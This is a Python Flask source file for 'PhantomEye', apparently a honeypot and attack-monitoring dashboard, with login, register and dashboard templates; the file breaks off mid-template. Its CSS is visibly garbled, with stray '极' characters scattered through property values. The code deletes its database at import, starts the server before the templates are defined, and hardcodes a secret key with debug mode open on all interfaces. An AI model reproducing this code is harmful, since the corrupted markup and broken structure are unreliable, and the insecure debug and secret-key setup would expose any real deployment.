from flask import Flask, render_template_string, request, redirect, url_for, session, flash, jsonify
import sqlite3
import os
import requests
from bs4 import BeautifulSoup
import hashlib
from email_validator import validate_email, EmailNotValidError
import re
from datetime import datetime
import random
import uuid
import json
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
app.secret_key = 'phantom-eye-secure-key-2023'

# Delete the corrupted database
if os.path.exists('phantomeye.db'):
    os.remove('phantomeye.db')
    print("🗑️ Deleted corrupted database")
# Configuration
class Config:
    DATABASE_PATH = 'phantomeye.db'
    MAIL_SERVER = 'smtp.gmail.com'
    MAIL_PORT = 587
    MAIL_USE_TLS = True
    MAIL_USERNAME = 'your-email@gmail.com'
    MAIL_PASSWORD = 'your-app-password'
    MAIL_DEFAULT_SENDER = 'your-email@gmail.com'


app.config.from_object(Config)
import os
import sqlite3


def cleanup_and_init():
    """Clean up and initialize database properly"""
    db_path = 'phantomeye.db'

    # Remove old database
    if os.path.exists(db_path):
        try:
            os.remove(db_path)
            print("🗑️ Removed old database file")
        except Exception as e:
            print(f"❌ Error removing database: {e}")
            return False

    # Initialize fresh database
    try:
        init_db()
        print("✅ Database created successfully!")
        return True
    except Exception as e:
        print(f"❌ Error creating database: {e}")
        return False


# Run this before starting your app
if __name__ == '__main__':
    if cleanup_and_init():
        print("🚀 Starting PhantomEye Server...")
        app.run(host='0.0.0.0', port=5000, debug=True)
    else:
        print("❌ Failed to initialize database")
# =============== HTML TEMPLATES ===============
BASE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title} - PhantomEye</title>
    <style>
        :root {{
            --main-bg: #0a0a0a;
            --card-bg: #111111;
            --accent: #00ff41;
            --accent-secondary: #0088ff;
            --text: #e0e0e0;
            --danger: #ff2a6d;
            --warning: #ffcc00;
            --success: #00ff41;
        }}

        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            background: var(--main-bg);
            color: var(--text);
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            min-height: 100vh;
        }}

        .navbar {{
            background: rgba(0, 0, 0, 0.95);
            padding: 15px 极px;
            border-bottom: 1px solid var(--accent);
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }}

        .navbar-brand {{
            font-size: 24px;
            font-weight: bold;
            color: var(--accent);
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
            text-decoration: none;
        }}

        .navbar-nav {{
            display: flex;
            gap: 15px;
            align-items: center;
        }}

        .navbar-nav a {{
            color: var(--text);
            text-decoration: none;
            padding: 8px 12px;
            border-radius: 3px;
            transition: all 0.3s;
            font-size: 14px;
        }}

        .navbar-nav a:hover {{
            background: rgba(0, 255, 65, 0.1);
            color: var(--accent);
        }}

        .navbar-nav a.active {{
            background: var(--accent);
            color: #000;
            font-weight: bold;
        }}

        .navbar-user {{
            color: var(--accent);
            display: flex;
            align-items: center;
            gap: 15px;
        }}

        .navbar-user a {{
            color: var(--accent);
            text-decoration: none;
            padding: 5px 10px;
            border-radius: 3px;
            transition: all 0.3s;
        }}

        .navbar-user a:hover {{
            background: rgba(0, 255, 65, 0.1);
        }}

        .logout-btn {{
            color: var(--danger) !important;
        }}

        .logout-btn:hover {{
            background: rgba(255, 42, 109, 0.1) !important;
        }}

        .container {{
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
        }}

        .card {{
            background: var(--card-bg);
            border: 1px solid #222;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}

        .btn {{
            padding: 10px 20px;
            background:极 var(--accent);
            color: #000;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
            font-size: 14极;
        }}

        .btn:hover {{
            background: #00cc33;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 255, 65, 0.3);
        }}

        .btn-danger {{
            background: var(--danger);
        }}

        .btn-danger:hover {{
            background: #cc2255;
            box-shadow: 0 4px 8px rgba(255, 42, 109, 0.3);
        }}

        .btn-secondary {{
            background: #333;
            color: var(--text);
        }}

        .btn-secondary:hover {{
            background: #444;
            box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
        }}

        .btn-warning {{
            background: var(--warning);
            color: #000;
        }}

        .btn-warning:hover {{
            background: #e6b800;
            box-shadow: 0 4px 8px rgba(255, 204, 0, 0.3);
        }}

        .btn-small {{
            padding: 5px 10px;
            font-size: 12px;
        }}

        .form-group {{
            margin-bottom: 20px;
        }}

        label {{
            display: block;
            margin-bottom: 5px;
            color: var(--accent);
            font-weight: bold;
            font-size: 14px;
        }}

        input, select, textarea {{
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: var(--text);
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            transition: all 0.3s;
        }}

        input:focus, select:极, textarea:focus {{
            border-color: var(--accent);
            outline: none;
            box-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
        }}

        .alert {{
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border: 1px solid transparent;
            font-size: 14px;
        }}

        .alert-success {{
            background: rgba(0, 255, 65, 0.1);
            border-color: var(--accent);
            color: var(--accent);
        }}

        .alert-danger {{
            background: rgba(255, 42, 109, 0.1);
            border-color: var(--danger);
            color:极(--danger);
        }}

        .alert-warning {{
            background: rgba(255, 204, 0, 0.1);
            border-color: var(--warning);
            color: var(--warning);
        }}

        .alert-info {{
            background: rgba(0, 136, 255, 0.1);
            border-color: var(--accent-secondary);
            color: var(--accent-secondary);
        }}

        .stats-grid {{
            display: grid;
            grid-template-column极: repeat(auto-fit, min极(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}

        .stat-card {{
            background: var(--card-bg);
            border: 1px solid var(--accent);
            border-radius: 5px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
        }}

        .stat-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 8px 16px rgba(0, 255, 65, 0.2);
        }}

        .stat-number {{
            font-size: 32px;
            font-weight: bold;
            color: var(--accent);
            margin: 10px 0;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }}

        .stat-label {{
            color: #888;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}

        .attacks-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background: var(--card-bg);
            border-radius: 5px;
            overflow: hidden;
        }}

        .attacks-table th,
        .attacks-table td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
            font-size: 14px;
        }}

        .attacks-table th {{
            background: rgba(0, 255, 65, 0.1);
            color: var(--accent);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}

        .attacks-table tr:hover {{
            background: rgba(0, 255, 65, 0.05);
        }}

        .severity-high {{
            color: var(--danger);
            font-weight: bold;
        }}

        .severity-medium {{
            color: var(--warning);
            font-weight: bold;
        }}

        .severity-low {{
            color: var(--accent);
            font-weight: bold;
        }}

        .severity-critical {{
            color: var(--danger);
            font-weight: bold;
            text-shadow: 0 0 5px rgba(255, 42, 109, 0.5);
            animation: pulse 2s infinite;
        }}

        @keyframes pulse {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.7; }}
            100% {{ opacity: 1; }}
        }}

        .website-list, .honeypot-list, .app-list {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }}

        .website-card, .honeypot-card, .app-card {{
            background: var(--card-bg);
            border: 1px solid #222;
            border-radius: 5px;
            padding: 20px;
            transition: all 0.3s;
        }}

        .website-card:hover, .honeypot-card:hover, .app-card:hover {{
            border-color: var(--accent);
            transform: translateY(-5px);
            box-shadow: 0 8px 16px rgba(0, 255, 65, 0.2);
        }}

        .website-status, .honeypot-status, .app-status {{
            display: inline-block;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }}

        .status-active {{
            background: rgba(0, 255, 65, 0.2);
            color: var(--accent);
        }}

        .status-inactive {{
            background: rgba(255, 42, 109, 0.2);
            color: var(--danger);
        }}

        .status-warning {{
            background: rgba(255, 204, 0, 0.2);
            color: var(--warning);
        }}

        .honeypot-interactions {{
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #222;
        }}

        .interaction-item {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 5极;
            font-size: 12px;
        }}

        .home-grid {{
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 20px;
        }}

        .preview-container {{
            margin-top: 20px;
            padding: 20px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
        }}

        .preview-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }}

        .login-preview {{
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background: #222;
            border-radius: 5px;
        }}

        .login-preview input {{
            margin-bottom: 15px;
        }}

        .tab-container {{
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #333;
        }}

        .tab {{
            padding: 10px 20px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
        }}

        .tab:hover {{
            color: var(--accent);
        }}

        .tab.active {{
            border-bottom: 2px solid var(--accent);
            color: var(--accent);
        }}

        .tab-content {{
            display: none;
        }}

        .tab-content.active {{
            display: block;
        }}

        .ai-detection-badge {{
            display: inline-block;
            padding: 3px 8px;
            background: rgba(255, 42, 109, 0.2);
            color: var(--danger);
            border-radius: 3px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 5px;
        }}

        .attack-timeline {{
            margin-top: 30px;
        }}

        .timeline-item {{
            display: flex;
            margin-bottom: 20px;
            position: relative;
        }}

        .timeline-dot {{
            width: 12px;
            height: 12px;
            background: var(--accent);
            border-radius: 50%;
            margin-right: 15px;
            margin-top: 5px;
            flex-shrink: 0;
        }}

        .timeline-content {{
            flex: 1;
            background: var(--card-b极);
            padding: 15px;
            border-radius: 5px;
            border-left: 3px solid var(--accent);
        }}

        .timeline-time {{
            color: #888;
            font-size: 12px;
            margin-bottom: 5px;
        }}

        .timeline-title {{
            color: var(--accent);
            margin-bottom: 5px;
            font-weight: bold;
        }}

        .progress-bar {{
            height: 5px;
            background: #333;
            border-radius: 3px;
            overflow: hidden;
            margin: 10px 0;
        }}

        .progress-fill {{
            height: 100%;
            background: var(--accent);
            border-radius: 3px;
            transition: width 0.3s ease;
        }}

        .security-shield {{
            text-align: center;
            margin: 30px 0;
        }}

        .shield-icon {{
            font-size: 48px;
            color: var(--accent);
            margin-bottom: 10px;
            text-shadow: 0极 10px rgba(0, 255, 65, 0.5);
        }}

        .cyber-glitch {{
            position: relative;
            display: inline-block;
        }}

        .cyber-glitch::before,
        .cyber-glitch::after {{
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }}

        .cyber-glitch::before {{
            left: 2px;
            text-shadow: -2px 0 #ff00cc;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }}

        .cyber-glitch::after {{
            left: -2px;
            text-shadow: -2px 0 #00ffff;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim2 5s infinite linear alternate-reverse;
        }}

        @keyframes glitch-anim {{
            0% {{ clip: rect(42px, 9999px, 44px, 0); }}
            5% {{ clip: rect(12px, 9999px, 59px, 0); }}
            10% {{ clip: rect(48px, 9999px, 29px, 极); }}
            15.0% {{ clip: rect(42px, 9999px, 73px, 0); }}
            20% {{ clip: rect(63px, 9999px极, 27px, 0); }}
            25% {{ clip: rect(34px, 9999px, 55px, 0); }}
            30.0% {{ clip: rect(86px, 9999px, 73px, 0); }}
            35% {{ clip: rect(20px, 9999px, 20px, 0); }}
            40% {{ clip: rect(26px, 9999px, 60px, 0); }}
            45% {{ clip: rect(25px, 9999px, 66px, 0); }}
            50% {{ clip: rect(57px, 9999px, 98px, 0); }}
            55.0% {{ clip: rect(5px, 9999px, 46px, 0极); }}
            60% {{ clip: rect(82px, 9999px, 31px, 0); }}
            65% {{极: rect(54px, 9999px, 27px, 0); }}
            70% {{ clip: rect(28px, 9999px, 99px, 0); }}
            75% {{ clip: rect(45px, 9999px, 69px, 0); }}
            80% {{ clip: rect(23px, 9999px, 85px, 0); }}
            85.0% {{ clip: rect(54px, 9999px, 84px, 0); }}
            90% {{ clip: rect(45px, 9999px, 47px, 0); }}
            95% {{ clip: rect(24px, 9999px, 23px, 0); }}
            100% {{ clip: rect(32px, 9999px, 92px, 0); }}
        }}

        @keyframes glitch-anim2 {{
            0% {{ clip: rect(65px, 9999px, 100px, 0); }}
            5% {{ clip: rect(52px, 9999px, 74px, 0); }}
            10% {{ clip: rect(79px, 9999px, 85px, 0); }}
            15.0% {{ clip: rect(75px, 9999px, 5px, 0); }}
            20% {{ clip: rect(67px, 9999px, 61px, 0); }}
            25% {{ clip: rect(14px, 9999px极, 79px, 0); }}
            30.0% {{ clip: rect(1px, 9999px, 66px, 0极); }}
            35% {{ clip: rect(86px, 9999px, 30px, 0); }}
            40% {{ clip: rect(23px, 9999px, 98px, 0); }}
            45% {{ clip: rect(85px, 9999px, 72px, 0); }}
            50% {{ clip: rect(71px, 9999px, 75px, 0); }}
            55.0% {{ clip: rect(2px, 9999px, 48px, 0); }}
            60% {{ clip: rect(30px, 9999px, 16px, 0); }}
            65% {{ clip: rect(59px, 9999px, 50px, 0); }}
            70% {{ clip: rect极(41px, 9999px, 62px, 0); }}
            75% {{ clip: rect(2px, 9999px, 82px, 0); }}
            80% {{ clip: rect(47px, 9999px极, 73px, 0); }}
            85.0% {{ clip: rect(3px, 9999px, 27px, 0); }}
            90% {{ clip: rect(26px, 9999px, 55px, 0); }}
            95% {{ clip: rect(42px, 9999px, 97px, 0); }}
            100% {{ clip: rect(38px, 9999px, 49px, 0); }}
        }}

        .scan-line {{
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent), transparent);
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            animation: scan 3s linear infinite;
        }}

        @keyframes scan {{
            0% {{ top: 0; }}
            100% {{ top: 100%; }}
        }}

        .terminal {{
            background: #000;
            border: 1px solid var(--accent);
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: var(--accent);
            margin: 15px 0;
            overflow-x: auto;
        }}

        .terminal-command {{
            color: var(--accent-secondary);
        }}

        .terminal-output {{
            color: var(--accent);
        }}

        .terminal-error {{
            color: var(--danger);
        }}

        .login-container {{
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
        }}

        .login-card {{
            background: var(--card-bg);
            border: 1px solid var(--accent);
            border-radius: 5px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }}

        .login-title {{
            text-align: center;
            color: var(--accent);
            margin-bottom: 30px;
           极-size: 24px;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }}

        .footer {{
            text-align: center;
            padding: 20px;
            margin-top: 40px;
            border-top: 1px solid #222;
            color: #888;
            font-size: 12px;
        }}

        .suggestions-container {{
            position: relative;
        }}

        .suggestions-list {{
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: var(--card-bg);
            border: 1px solid #333;
            border-top: none;
            border-radius: 0 0 3px 3px;
            max-height: 200px;
            overflow-y: auto;
            z-index: 1000;
            display: none;
        }}

        .suggestion-item {{
            padding: 10px;
            cursor: pointer;
            border-bottom: 1px solid #222;
            transition: background 0.2s;
        }}

        .suggestion-item:hover {{
            background: rgba(0, 255, 65, 0.1);
        }}

        .suggestion-item:last-child {{
            border-bottom: none;
        }}

        /* Clone Preview Styles */
        .clone-preview-modal {{
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
        }}

        .clone-preview-content {{
            background: var(--card-bg);
            margin: 5% auto;
            padding: 20px;
            border: 2px solid var(--accent);
            width: 90%;
            max-width: 1000px;
            max-height: 80vh;
            overflow: auto;
            border-radius: 10px;
            position: relative;
        }}

        .clone-preview-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--accent);
        }}

        .close-preview {{
            color: var(--accent);
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            background: none;
            border: none;
        }}

        .close-preview:hover {{
            color: var(--danger);
        }}

        .preview-iframe {{
            width: 100%;
            height: 500px;
            border: 1px solid #333;
            border-radius: 5px;
            background: white;
        }}

        .preview-container {{
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            background: #1a1a1a;
        }}

        .mini-preview {{
            max-height: 300px;
            overflow: auto;
            border: 1px solid #333;
            padding: 10px;
            background: white;
            color: black;
            border-radius: 5px;
        }}

        .preview-buttons {{
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }}

        .preview-btn {{
            padding: 8px 15px;
            background: var(--accent);
            color: black;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
        }}

        .preview-btn:hover {{
            background: #00cc33;
        }}

        .clone-status {{
            display: inline-block;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 10px;
        }}

        .status-success {{
            background: rgba(0, 255, 65, 0.2);
            color: var(--accent);
        }}

        .status-warning {{
            background: rgba(255, 204, 0, 0.2);
            color: var(--warning);
        }}

        .status-error {{
            background: rgba(255, 42, 109, 0.2);
            color: var(--danger);
        }}

        .website-preview {{
            border: 2px solid var(--accent);
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }}

        .preview-url-bar {{
            background: #333;
            padding: 8px 15px;
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}

        .preview-security-badge {{
            background: var(--accent);
            color: black;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }}

        /* Responsive Design */
        @media (max-width: 768px) {{
            .home-grid {{
                grid-template-columns: 1fr;
            }}

            .navbar {{
                flex-direction: column;
                gap: 10px;
                padding: 10px;
            }}

            .navbar-nav {{
                flex-wrap: wrap;
                justify-content: center;
            }}

            .stats-grid {{
                grid-template-columns: 1fr;
            }}

            .website-list, .honeypot-list, .app-list {{
                grid-template-columns: 1fr;
            }}

            .container {{
                padding: 10px;
            }}

            .clone-preview-content {{
                width: 95%;
                margin: 2% auto;
            }}
        }}

        @media (max-width: 480px) {{
            .navbar-nav {{
                flex-direction: column;
                gap: 5px;
            }}

            .navbar-user {{
                flex-direction: column;
                gap: 5px;
            }}

            .btn {{
                width: 100%;
                margin-bottom: 5px;
            }}

            .preview-buttons {{
                flex-direction: column;
            }}
        }}
    </style>
</head>
<body>
    <div class="scan-line"></div>

    <div class="navbar">
        <a href="/dashboard" class="navbar-brand">PHANTOMEYE</a>
        <div class="navbar-nav">
            <a href="/dashboard" class="{dashboard_active}">DASHBOARD</a>
            <a href="/websites" class="{websites_active}">WEBSITES</a>
            <a href="/apps" class="{apps_active}">MOBILE APPS</a>
            <a href="/honeypots" class="{honeypots_active}">HONEYPOTS</a>
            <a href="/add-website" class="{add_website_active}">PROTECT SITE</a>
            <a href="/add-app" class="{add_app_active}">PROTECT APP</a>
            <a href="/add-honeypot" class="{add_honeypot_active}">CREATE HONEYPOT</a>
        </div>
        <div class="navbar-user">
            <span>Welcome, {username}</span>
            <a href="/settings">SETTINGS</a>
            <a href="/logout" class="logout-btn">LOGO</a>
        </div>
    </div>

    <div class="container">
        {alerts}
        {content}
    </div>

    <div class="footer">
        <p>PhantomEye Security System &copy; 2023 | AI-Powered Cyber Defense</p>
    </div>

    <!-- Clone Preview Modal -->
    <div id="clonePreviewModal" class="clone-preview-modal">
        <div class="clone-preview-content">
            <div class="clone-preview-header">
                <h3 id="previewTitle">CLONE PREVIEW</h3>
                <button class="close-preview">&times;</button>
            </div>
            <div id="previewContent">
                <!-- Preview content will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        function showTab(tabName) {{
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

            document.querySelector(`[data-tab="${{tabName}}"]`).classList.add('active');
            document.getElementById(`tab-${{tabName}}`).classList.add('active');
        }}

        function previewHoneypot(type) {{
            const preview = document.getElementById('honeypot-preview');
            let html = '';

            switch(type) {{
                case 'login':
                    html = `
                        <div class="login-preview">
                            <h3 style="text-align: center; color: var(--accent);">Admin Login</h3>
                            <input type="text" placeholder="Username" value="admin">
                            <input type="password" placeholder="Password" value="••••••••">
                            <button class="btn" style="width: 100%;">Login</button>
                            <p style="text-align: center; margin-top: 15px; color: #888;">
                                <a href="#" style="color: var(--accent);">Forgot Password?</a>
                            </p>
                        </div>
                    `;
                    break;
                case 'admin':
                    html = `
                        <div style="padding: 20px;">
                            <h3 style="color: var(--accent);">Admin Dashboard</h3>
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;">
                                <div style="background: #333 padding: 15px; border-radius: 5px;">
                                    <h4>Users</h4>
                                    <p>Total: 1,243</p>
                                </div>
                                <div style="background: #333; padding: 15px; border-radius: 5px;">
                                    <h4>Orders</h4>
                                    <p>Today: 42</p>
                                </div>
                            </div>
                            <button class="btn">Manage Users</button>
                            <button class="btn" style="margin-left: 10px;">View Reports</button>
                        </div>
                    `;
                    break;
                case 'database':
                    html = `
                        <div style="padding: 20px;">
                            <h3 style="color: var(--accent);">Database Manager</h3>
                            <div style="background: #333; padding: 15px; border-radius: 5px; margin: 15px 0;">
                                <h4>Database: production_db</h4>
                                <p>Size: 2.4GB | Tables: 28</p>
                            </div>
                            <input type="text" placeholder="SQL Query" value="SELECT * FROM users">
                            <button class="btn" style="margin-top: 10px;">Execute</button>
                        </div>
                    `;
                    break;
                default:
                    html = '<p>Select a honeypot type to preview</p>';
            }}

            preview.innerHTML = html;
        }}

        function getAppSuggestions(query) {{
            if (query.length < 2) {{
                document.getElementById('app-suggestions').style.display = 'none';
                return;
            }}

            fetch(`/api/app-suggestions?q=${{encodeURIComponent(query)}}`)
                .then(response => response.json())
                .then(data => {{
                    const suggestionsContainer = document.getElementById('app-suggestions');
                    if (data.suggestions && data.suggestions.length > 0) {{
                        suggestionsContainer.innerHTML = data.suggestions.map(app => 
                            `<div class="suggestion-item" onclick="selectApp('${{app.name}}', '${{app.package}}')">
                                <strong>${{app.name}}</strong> (${{app.category}})
                             </div>`
                        ).join('');
                        suggestionsContainer.style.display = 'block';
                    }} else {{
                        suggestionsContainer.style.display = 'none';
                    }}
                }});
        }}

        function selectApp(name, package) {{
            document.getElementById('app_name').value = name;
            document.getElementById('app_package').value = package;
            document.getElementById('app-suggestions').style.display = 'none';
        }}

        function testHoneypot(url) {{
            alert(`Testing honeypot: ${{url}}\\nThis would redirect to the honeypot in a real implementation.`);
        }}

        function showClonePreview(type, id, name, url = null) {{
            const modal = document.getElementById('clonePreviewModal');
            const title = document.getElementById('previewTitle');
            const content = document.getElementById('previewContent');

            title.textContent = `PREVIEW: ${{name}}`;

            // Show loading state
            content.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <div class="terminal">
                        <div class="terminal-command">$ loading preview...</div>
                        <div class="terminal-output">> Generating clone preview</div>
                    </div>
                </div>
            `;

            modal.style.display = 'block';

            // Fetch preview content
            fetch(`/api/clone-preview?type=${{type}}&id=${{id}}${{url ? '&url=' + encodeURIComponent(url) : ''}}`)
                .then(response => response.json())
                .then(data => {{
                    if (data.success) {{
                        content.innerHTML = data.html;
                    }} else {{
                        content.innerHTML = `
                            <div class="alert alert-danger">
                                <strong>Error:</strong> ${{data.error}}
                            </div>
                            <div class="terminal">
                                <div class="terminal-error">Failed to generate preview</div>
                            </div>
                        `;
                    }}
                }})
                .catch(error => {{
                    content.innerHTML = `
                        <div class="alert alert-danger">
                            <strong>Error:</strong> Failed to load preview
                        </div>
                        <div class="terminal">
                            <div class="terminal-error">${{error}}</div>
                        </div>
                    `;
                }});
        }}

        function closePreview() {{
            document.getElementById('clonePreviewModal').style.display = 'none';
        }}

        // Close modal when clicking on X
        document.querySelector('.close-preview').addEventListener('click', closePreview);

        // Close modal when clicking outside
        window.addEventListener('click', function(event) {{
            const modal = document.getElementById('clonePreviewModal');
            if (event.target === modal) {{
                closePreview();
            }}
        }});

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {{
            // Close suggestions when clicking outside
            document.addEventListener('click', function(e) {{
                if (!e.target.closest('.suggestions-container')) {{
                    document.getElementById('app-suggestions').style.display = 'none';
                }}
            }});
        }});
    </script>
</body>
</html>'''

LOGIN_HTML = '''<div class="login-container">
    <div class="login-card">
        <h2 class="login-title">PHANTOMEYE ACCESS</h2>

        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">USERNAME:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">PASSWORD:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn" style="width: 100%;">SECURE LOGIN</button>
        </form>

        <div style="text-align: center; margin-top: 20px;">
            <a href="/register" style="color: var(--accent);">REQUEST ACCESS</a>
        </div>
    </div>

    <div class="terminal">
        <div class="terminal-command">$ system initialized</div>
        <div class="terminal-output">> PhantomEye security system active</div>
        <div class="terminal-command">$ threat_detection --status</div>
        <div class="terminal-output">> AI models: loaded and active</div>
        <div class="terminal-command">$ honeypot_network --deploy</div>
        <div class="terminal-output">> Honeypot system: ready</div>
    </div>
</div>'''

REGISTER_HTML = '''<div class="login-container">
    <div class="login-card">
        <h2 class="login-title">REQUEST ACCESS</h2>

        <form method="POST" action="/register">
            <div class="form-group">
                <label for="username">OPERATIVE ID:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="email">CONTACT FREQUENCY:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">ENCRYPTION KEY:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn" style="width: 100%;">REQUEST ACCESS</button>
        </form>

        <div style="text-align: center; margin-top: 20px;">
            <a href="/login" style="color: var(--accent);">ALREADY HAVE CLEARANCE?</a>
        </div>
    </div>
</div>'''

DASHBOARD_HTML = '''<div class="home-grid">
    <div>
        <div class="security-shield">
            <div class="shield-icon">🛡️</div>
            <h2 class="cyber-glitch" data-text="SYSTEM SECURE">SYSTEM SECURE</h2>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <class="stat-label">TOTAL ATTACKS</div>
                <div class="stat-number">{stats_total_attacks}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">AI ATTACKS DETECTED</div>
                <div class="stat-number" style="color: var(--danger);">{stats_ai_attacks}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">CRITICAL THREATS</div>
                <div class="stat-number">{stats_critical_attacks}</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">ACTIVE HONEYPOTS</div>
                <div class="stat-number">{stats_active_honeypots}</div>
            </div>
        </div>

        <div class="card">
            <h3>QUICK ACTIONS</h3>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <a href="/add-website" class="btn">PROTECT WEBSITE</a>
                <a href="/add-app" class="btn">PROTECT APP</a>
                <a href="/add-honeypot" class="btn">CREATE HONEYPOT</a>
                <a href="/simulate-ai-attack" class="btn btn-warning">TEST AI DEFENSE</a>
            </div>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin: 20px 0;">
            <h3>RECENT ATTACKS</h3>
            <a href="/attacks" class="btn btn-secondary">VIEW ALL</a>
        </div>

        <table class="attacks-table">
            <thead>
                <tr>
                    <th>TIME</th>
                    <th>IP ADDRESS</th>
                    <th>ATTACK TYPE</th>
                    <th>SEVERITY</th>
                    <th>AI DETECTION</th>
                </tr>
            </thead>
            <tbody>
                {attacks_rows}
            </tbody>
        </table>

        <div class="attack-timeline">
            <h3>SECURITY TIMELINE</h3>
            <div class="timeline-item">
                <div class="timeline-dot"></div>
                <div class="timeline-content">
                    <div class="timeline-time">Just now</div>
                    <div class="timeline-title">System Initialized</div>
                    <p>PhantomEye security system activated and running</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-dot"></div>
                <div class="timeline-content">
                    <div class="timeline-time">2 minutes ago</div>
                    <div class="timeline-title">AI Defense Activated</div>
                    <p>Machine learning models loaded for attack detection</p>
                </div>
            </div>
            <div class="timeline-item">
                <div class="timeline-dot"></div>
                <div class="timeline-content">
                    <div class="timeline-time">5 minutes ago</div>
                    <div class="timeline-title">Honeypots Deployed</div>
                    <p>{stats_active_honeypots} honeypot systems activated and monitoring</p>
                </div>
            </div>
        </div>
    </div>

    <div>
        <h3>YOUR ACTIVE HONEYPOTS</h3>
        <div class="honeypot-list">
            {active_honeypots}
        </div>

        <div class="card" style="margin-top: 20px;">
            <h3>SYSTEM STATUS</h3>
            <div class="interaction-item">
                <span>Websites Protected:</span>
                <span style="color: var(--accent);">{stats_websites}</span>
            </div>
            <div class="interaction-item">
                <span>Mobile Apps Protected:</span>
                <span style="color: var(--accent);">{stats_apps}</span>
            </div>
            <div class="interaction-item">
                <span>Honeypot Interactions:</span>
